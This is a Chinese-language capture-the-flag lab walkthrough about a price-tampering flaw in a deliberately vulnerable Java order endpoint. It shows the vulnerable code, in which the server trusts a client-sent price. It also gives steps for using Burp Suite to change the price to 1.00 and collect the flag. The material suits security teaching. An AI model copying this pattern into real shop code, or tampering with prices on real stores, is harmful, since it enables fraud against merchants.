# Level 1 — 价格篡改

## 关卡说明

本关模拟商品购买功能，下单接口接受前端传入的价格参数，服务端直接使用该价格计算订单金额，未与数据库中的真实价格做校验。当提交价格低于真实价格时，说明用户已成功篡改价格，返回Flag。

**目标**：通过修改下单请求中的价格参数，以低于原价的价格购买商品，获取 Flag。

## 漏洞原理

### 代码逻辑分析

本关的后端代码位于 `PriceTamperController.java`，相关接口：

```
GET  /api/challenge/biz-logic/price/products  — 获取商品列表
POST /api/challenge/biz-logic/price/order      — 下单
```

**入参**：

```json
{
  "productId": 1,
  "productName": "Laptop",
  "price": 999.99,
  "quantity": 1
}
```

**数据流**：

```
前端展示商品列表（price=999.99）
    ↓
用户点击购买，前端提交 {productId, price, quantity}
    ↓
后端 PriceTamperController.createOrder()
    ↓
从 PRODUCTS 列表查找商品 → 获取 actualPrice
    ↓
【漏洞】直接使用 submittedPrice 计算，未校验 submittedPrice == actualPrice
    ↓
submittedPrice < actualPrice → 返回 Flag（价格篡改成功）
submittedPrice >= actualPrice → 正常下单
```

**漏洞点**：

1. **价格由前端传入**：`price` 字段来自请求体，服务端未校验其与数据库真实价格的一致性。
2. **无价格校验逻辑**：服务端虽然查出了真实价格 `actualPrice`，但仅用于判断是否触发漏洞，而非用于订单金额计算。

### 源码关键片段

```java
// PriceTamperController.java — 漏洞核心
Double actualPrice = ((Number) targetProduct.get("price")).doubleValue();

// 【漏洞核心】服务端直接使用前端提交的价格，未做校验
if (submittedPrice < actualPrice) {
    // 价格被篡改 — 返回Flag
    String flag = flagService.getFlag("business-logic", "level1");
    result.put("paidPrice", submittedPrice);
    result.put("flag", flag);
} else {
    // 正常下单
    result.put("totalPrice", submittedPrice * quantity);
}
```

## 通关步骤

### Step 1：查看商品列表

```
GET /api/challenge/biz-logic/price/products
```

记录商品ID和价格，例如 Laptop (id=1, price=999.99)。

### Step 2：正常下单

提交正常价格，观察返回结果：

```json
POST /api/challenge/biz-logic/price/order
{
  "productId": 1,
  "price": 999.99,
  "quantity": 1
}
```

### Step 3：篡改价格

使用Burp Suite拦截请求，将价格修改为低于原价的值：

```json
{
  "productId": 1,
  "price": 1.00,
  "quantity": 1
}
```

### Step 4：获取 Flag

价格篡改成功后，响应中包含 Flag：

```json
{
  "success": true,
  "paidPrice": 1.00,
  "originalPrice": 999.99,
  "flag": "flag{...}"
}
```

## 涉及文件

| 文件 | 说明 |
|------|------|
| `controller/challenge/businesslogic/PriceTamperController.java` | 后端下单接口 |
| `service/FlagService.java` | Flag 获取与验证 |
